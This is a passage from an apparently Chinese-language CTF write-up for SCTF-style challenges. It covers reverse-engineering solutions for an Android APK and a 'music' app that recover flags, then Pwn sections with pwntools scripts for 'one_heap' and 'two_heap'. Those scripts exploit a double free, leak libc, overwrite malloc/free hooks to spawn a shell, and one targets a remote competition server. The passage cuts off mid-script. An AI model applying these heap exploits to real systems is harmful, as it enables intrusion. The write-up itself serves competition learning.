class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0x0BE</span>, <span class="number">0x4</span>, <span class="number">0x0C3</span>, <span class="number">0x0AA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x6</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0x0F4</span>, <span class="number">0x91</span>, <span class="number">0x0EF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0x0ED</span>, <span class="number">0x0CF</span>, <span class="number">0x0AC</span>, <span class="number">0x62</span>, <span class="number">0x0E4</span>, <span class="number">0x0B3</span>, <span class="number">0x1C</span>, <span class="number">0x0A9</span>, <span class="number">0x0C9</span>, <span class="number">0x8</span>, <span class="number">0x0E8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0x0DF</span>, <span class="number">0x94</span>, <span class="number">0x0FA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0x0A6</span>, <span class="number">0x47</span>, <span class="number">0x7</span>, <span class="number">0x0A7</span>, <span class="number">0x0FC</span>, <span class="number">0x0F3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0x0BA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0x0E6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0x0A8</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0x0B2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0x0DA</span>, <span class="number">0x8B</span>, <span class="number">0x0F8</span>, <span class="number">0x0EB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x0D1</span>, <span class="number">0x0A2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x1</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0x0D4</span>, <span class="number">0x0</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0x0D3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x2</span>, <span class="number">0x0E7</span>, <span class="number">0x0A0</span>, <span class="number">0x0C4</span>, <span class="number">0x0C8</span>, <span class="number">0x9E</span>, <span class="number">0x0EA</span>, <span class="number">0x0BF</span>, <span class="number">0x8A</span>, <span class="number">0x0D2</span>, <span class="number">0x40</span>, <span class="number">0x0C7</span>, <span class="number">0x38</span>, <span class="number">0x0B5</span>, <span class="number">0x0A3</span>, <span class="number">0x0F7</span>, <span class="number">0x0F2</span>, <span class="number">0x0CE</span>, <span class="number">0x0F9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0x0A1</span>, <span class="number">0x0E0</span>, <span class="number">0x0AE</span>, <span class="number">0x5D</span>, <span class="number">0x0A4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0x0AD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x0F5</span>, <span class="number">0x8C</span>, <span class="number">0x0B1</span>, <span class="number">0x0E3</span>, <span class="number">0x1D</span>, <span class="number">0x0F6</span>, <span class="number">0x0E2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0x0CA</span>, <span class="number">0x60</span>, <span class="number">0x0C0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0x0AB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0x0D5</span>, <span class="number">0x0DB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0x0DE</span>, <span class="number">0x0FD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x3</span>, <span class="number">0x0FF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0x0AF</span>, <span class="number">0x92</span>, <span class="number">0x0BB</span>, <span class="number">0x0DD</span>, <span class="number">0x0BC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0x0D9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0x0D8</span>, <span class="number">0x0A</span>, <span class="number">0x0C1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0x0A5</span>, <span class="number">0x0CD</span>, <span class="number">0x7B</span>, <span class="number">0x0BD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0x0D0</span>, <span class="number">0x12</span>, <span class="number">0x0B8</span>, <span class="number">0x0E5</span>, <span class="number">0x0B4</span>, <span class="number">0x0B0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x0B9</span>, <span class="number">0x0F1</span>, <span class="number">0x9</span>, <span class="number">0x0C5</span>, <span class="number">0x6E</span>, <span class="number">0x0C6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0x0F0</span>, <span class="number">0x7D</span>, <span class="number">0x0EC</span>, <span class="number">0x3A</span>, <span class="number">0x0DC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0x0EE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0x0D7</span>, <span class="number">0x0CB</span>, <span class="number">0x39</span>, <span class="number">0x48</span>, <span class="number">0x0C6</span>, <span class="number">0x0BA</span>, <span class="number">0x0B1</span>, <span class="number">0x0A3</span>, <span class="number">0x50</span>, <span class="number">0x33</span>, <span class="number">0x0AA</span>, <span class="number">0x56</span>, <span class="number">0x97</span>, <span class="number">0x91</span>, <span class="number">0x7D</span>, <span class="number">0x67</span>, <span class="number">0x0DC</span>, <span class="number">0x22</span>, <span class="number">0x70</span>, <span class="number">0x0B2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;;</span><br><span class="line">&gt; <span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">foo2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     <span class="keyword">unsigned</span> v1;</span><br><span class="line">&gt;     <span class="keyword">unsigned</span> <span class="keyword">char</span> byte[<span class="number">4</span>];</span><br><span class="line">&gt;     byte[<span class="number">0</span>] = a1&amp;<span class="number">0xff</span>;</span><br><span class="line">&gt;     byte[<span class="number">1</span>] = (a1&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">&gt;     byte[<span class="number">2</span>] = (a1&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">&gt;     byte[<span class="number">3</span>] = (a1&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">&gt;     v1 = (a[byte[<span class="number">0</span>]])|(a[byte[<span class="number">1</span>]]&lt;&lt;<span class="number">8</span>)|(a[byte[<span class="number">2</span>]]&lt;&lt;<span class="number">16</span>)|(a[byte[<span class="number">3</span>]]&lt;&lt;<span class="number">24</span>);</span><br><span class="line">&gt;     <span class="keyword">return</span> ROL(v1,<span class="number">12</span>)^ROL(v1,<span class="number">8</span>)^ROR(v1,<span class="number">2</span>)^ROR(v1,<span class="number">6</span>);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3, <span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     <span class="keyword">return</span> a1 ^ foo2(a2^a3^a4);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     <span class="keyword">unsigned</span> <span class="keyword">int</span> tmp[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">&gt;     <span class="keyword">unsigned</span> <span class="keyword">int</span> cipher[<span class="number">4</span>] = &#123;<span class="number">0xBE040680</span>, <span class="number">0xC5AF7647</span>, <span class="number">0x9FCC401F</span>, <span class="number">0xD8BF92EF</span>&#125;;</span><br><span class="line">&gt;     <span class="built_in">memcpy</span>(tmp+<span class="number">26</span>,cipher,<span class="number">16</span>);</span><br><span class="line">&gt; </span><br><span class="line">&gt;     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">25</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">&gt;         tmp[i] = foo(tmp[i+<span class="number">4</span>],tmp[i+<span class="number">1</span>],tmp[i+<span class="number">2</span>],tmp[i+<span class="number">3</span>]);</span><br><span class="line">&gt;     tmp[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">&gt;     <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)tmp);</span><br><span class="line">&gt; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; fl4g_is_s0_ug1y!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; sctf&#123;ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2><span id="strange-apk">strange apk</span></h2><blockquote><p>前12个chr</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;             localObject2 = new StringBuilder();</span><br><span class="line">&gt;             ((StringBuilder)localObject2).append(paramAnonymousView);</span><br><span class="line">&gt;             ((StringBuilder)localObject2).append(str.charAt(i));</span><br><span class="line">&gt;             paramAnonymousView = ((StringBuilder)localObject2).toString();</span><br><span class="line">&gt;             i++;</span><br><span class="line">&gt; </span><br><span class="line">&gt; if (((String)localObject2).equals(&quot;c2N0ZntXM2xjMG1l&quot;))</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; </span><br><span class="line">&gt; &gt;&gt;&gt; base64.b64decode(&quot;c2N0ZntXM2xjMG1l&quot;)</span><br><span class="line">&gt; &apos;sctf&#123;W3lc0me&apos;</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>有个data加密后的，直接虚拟机打开存着解密后的apk，拖下来直接分析。</p><p>后18个chr：</p><p>这里先用intent启动了其他class：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;             localObject1 = new Intent();</span><br><span class="line">&gt;             ((Intent)localObject1).putExtra(&quot;data_return&quot;, paramAnonymousView);</span><br><span class="line">&gt;             s.this.setResult(-1, (Intent)localObject1);</span><br><span class="line">&gt;             s.this.finish();</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>最后一段关键比较：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; if (f.encode(paramIntent.getStringExtra(&quot;data_return&quot;), (String)localObject1).equals(&quot;~8t808_8A8n848r808i8d8-8w808r8l8d8&#125;8&quot;))</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>这里生成MD5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;  try</span><br><span class="line">&gt;       &#123;</span><br><span class="line">&gt;         Object localObject2 = MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class="line">&gt;         ((MessageDigest)localObject2).update(&quot;syclover&quot;.getBytes());</span><br><span class="line">&gt;         BigInteger localBigInteger = new java/math/BigInteger;</span><br><span class="line">&gt;         localBigInteger.&lt;init&gt;(1, ((MessageDigest)localObject2).digest());</span><br><span class="line">&gt;         localObject2 = localBigInteger.toString(16);</span><br><span class="line">&gt;         localObject1 = localObject2;</span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt;       catch (Exception localException)</span><br><span class="line">&gt;       &#123;</span><br><span class="line">&gt;         localException.printStackTrace();</span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>照着写了个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;   public static void genMd5()&#123;</span><br><span class="line">&gt;     String plaintext = &quot;syclover&quot;;</span><br><span class="line">&gt;     try&#123;</span><br><span class="line">&gt;       MessageDigest m = MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class="line">&gt;       m.reset();</span><br><span class="line">&gt;       m.update(plaintext.getBytes());</span><br><span class="line">&gt;       byte[] digest = m.digest();</span><br><span class="line">&gt;       BigInteger bigInt = new BigInteger(1,digest);</span><br><span class="line">&gt;       String hashtext = bigInt.toString(16);</span><br><span class="line">&gt;       System.out.print(hashtext);</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     catch (Exception localException)</span><br><span class="line">&gt;     &#123;</span><br><span class="line">&gt;       localException.printStackTrace();</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;   &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>得到<code>8bfc8af07bca146c937f283b8ec768d4</code></p><p>那个关键比较有个encode函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; public static String encode(String paramString1, String paramString2)</span><br><span class="line">&gt;   &#123;</span><br><span class="line">&gt;     int i = paramString1.length();</span><br><span class="line">&gt;     int j = paramString2.length();</span><br><span class="line">&gt;     StringBuilder localStringBuilder = new StringBuilder();</span><br><span class="line">&gt;     for (int k = 0; k &lt; i; k++)</span><br><span class="line">&gt;     &#123;</span><br><span class="line">&gt;       localStringBuilder.append(paramString1.charAt(k));</span><br><span class="line">&gt;       localStringBuilder.append(paramString2.charAt(k / j));</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     return localStringBuilder.toString();</span><br><span class="line">&gt;   &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>出题人好像把取整跟取余搞混了。应该是k % j</p><p>这样的话，直接在flag里插入8得到字符串：~8t808_8A8n848r808i8d8-8w808r8l8d8}8</p><p>所以后半段flag：<code>~t0_An4r0id-w0rld}</code></p><p>所以整个flag: <code>sctf{W3lc0me~t0_An4r0id-w0rld}</code></p></blockquote><h2><span id="music">music</span></h2><blockquote><p><img src="https://p0.ssl.qhimg.com/t01543d49c8a233e412.png" alt="image"> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; cipher =</span><br><span class="line">&gt; C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53</span><br><span class="line">&gt; </span><br><span class="line">&gt; len(cipher) = 80</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>用jeb打开，能最终定位到一个关键函数，这个函数输入两个参数</p><p>第一个是flag，第二个是hellodsctf字符串的md5，输出为cipher。</p><p>直接爆破每一位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt; import java.lang.String;</span><br><span class="line">&gt; </span><br><span class="line">&gt; public class Main &#123;</span><br><span class="line">&gt;    public static void main(String[] args) &#123;</span><br><span class="line">&gt;        c a = new c();</span><br><span class="line">&gt;        String flag = &quot;sctf&#123;&quot;;</span><br><span class="line">&gt;        String printable = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-.:;&lt;=&gt;?@[]^_&#123;|&#125;~&quot;;</span><br><span class="line">&gt;        String ss = &quot;C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53&quot;;</span><br><span class="line">&gt;        for(int j=0;j&lt;100;j++)</span><br><span class="line">&gt;        &#123;</span><br><span class="line">&gt;            for(int i=0;i&lt;printable.length();i++)</span><br><span class="line">&gt;            &#123;</span><br><span class="line">&gt;                String now=  flag + printable.charAt(i);</span><br><span class="line">&gt;                //System.out.println(now);</span><br><span class="line">&gt;                String d = a.a(now,&quot;E7E64BF658BAB14A25C9D67A054CEBE5&quot;);</span><br><span class="line">&gt;                if(ss.indexOf(d) == 0)</span><br><span class="line">&gt;                &#123;</span><br><span class="line">&gt;                    System.out.println(&quot;flag: &quot; + now);</span><br><span class="line">&gt;                    flag = now;</span><br><span class="line">&gt;                &#125;</span><br><span class="line">&gt;            &#125;</span><br><span class="line">&gt;            //break;</span><br><span class="line">&gt;        &#125;</span><br><span class="line">&gt;    &#125;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><figure><img src="https://p0.ssl.qhimg.com/t014008c77063d0b87b.png" alt><figcaption>image.png</figcaption></figure></blockquote><h1><span id="pwn">Pwn</span></h1><h2><span id="one_heap">one_heap</span></h2><blockquote><p>存在double free的漏洞，利用heap的地址爆破proc的偏移实现house of three leak，</p><p>然后常规的tache attack就行。爆破几率在1/4096估计跑一下午就能出来。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">&gt; context.log_level = <span class="string">"debug"</span></span><br><span class="line">&gt; p = process(<span class="string">"./one_heap"</span>)</span><br><span class="line">&gt; a = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">&gt; <span class="comment">#p = remote("47.104.89.129",10001)</span></span><br><span class="line">&gt; gdb.attach(p)</span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">&gt;     p.sendline(<span class="string">"1"</span>)</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">&gt;     p.sendline(str(size))</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Input the content:"</span>)</span><br><span class="line">&gt;     p.sendline(content)</span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">()</span>:</span></span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">&gt;     p.sendline(<span class="string">"2"</span>)</span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">new0</span><span class="params">(size,content)</span>:</span></span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">&gt;     p.sendline(<span class="string">"1"</span>)</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">&gt;     p.sendline(str(size))</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Input the content:"</span>)</span><br><span class="line">&gt;     p.send(content)</span><br><span class="line">&gt; new(<span class="number">0x60</span>,<span class="string">"aaa"</span>)</span><br><span class="line">&gt; remove()</span><br><span class="line">&gt; remove()</span><br><span class="line">&gt; new(<span class="number">0x60</span>,<span class="string">"\x20\x60"</span>)</span><br><span class="line">&gt; new(<span class="number">0x60</span>,<span class="string">"b"</span>)</span><br><span class="line">&gt; raw_input()</span><br><span class="line">&gt; new(<span class="number">0x60</span>,<span class="string">"\x60\x07"</span>)</span><br><span class="line">&gt; pay = p64(<span class="number">0xfbad1880</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"\x00"</span></span><br><span class="line">&gt; new(<span class="number">0x60</span>,pay)</span><br><span class="line">&gt; libc_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">8</span>:<span class="number">8</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3ed8b0</span></span><br><span class="line">&gt; <span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">&gt; malloc_hook = a.symbols[<span class="string">"__malloc_hook"</span>]+libc_addr</span><br><span class="line">&gt; relloc_hook = a.symbols[<span class="string">"__realloc_hook"</span>]+libc_addr</span><br><span class="line">&gt; <span class="keyword">print</span> hex(malloc_hook)</span><br><span class="line">&gt; one = <span class="number">0x4f2c5</span>+libc_addr</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">print</span> one</span><br><span class="line">&gt; new(<span class="number">0x50</span>,<span class="string">"a"</span>)</span><br><span class="line">&gt; remove()</span><br><span class="line">&gt; remove()</span><br><span class="line">&gt; new(<span class="number">0x50</span>,p64(relloc_hook))</span><br><span class="line">&gt; new(<span class="number">0x50</span>,<span class="string">"peanuts"</span>)</span><br><span class="line">&gt; new(<span class="number">0x50</span>,p64(one)+p64(libc_addr+a.sym[<span class="string">'realloc'</span>]+<span class="number">0xe</span>))</span><br><span class="line">&gt; <span class="keyword">print</span> hex(one)</span><br><span class="line">&gt; new(<span class="number">0x30</span>,<span class="string">"b"</span>)</span><br><span class="line">&gt; p.interactive()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2><span id="two_heap">two_heap</span></h2><blockquote><p>漏洞点和one heap一样，同样是有tache的版本，</p><p>先绕过size的检查利用<code>0x0,0x8,0x10,0x18</code>进行绕过，</p><p>然后利用printf_chk可以用<code>a</code>来leak的特性算出libc</p><p>然后就可以attack free_hook然后通过<code>free("/bin/sh")</code> getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">&gt; context.log_level = <span class="string">"debug"</span></span><br><span class="line">&gt; <span class="comment">#p = process("./two_heap",env=&#123;"LD_PRELOAD":"./libc-2.26.so"&#125;)</span></span><br><span class="line">&gt; a = ELF(<span class="string">"./libc-2.26.so"</span>)</span><br><span class="line">&gt; p = remote(<span class="string">"47.104.89.129"</span>,<span class="number">10002</span>)</span><br><span class="line">&gt; <span class="comment">#gdb.attach(p)#,"b *0x5555555554a0")</span></span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">&gt;     p.sendline(<span class="string">"1"</span>)</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">&gt;     p.sendline(str(size))</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Input the note:"</span>)</span><br><span class="line">&gt;     p.sendline(content)</span><br><span class="line">&gt; <span class="function"><span 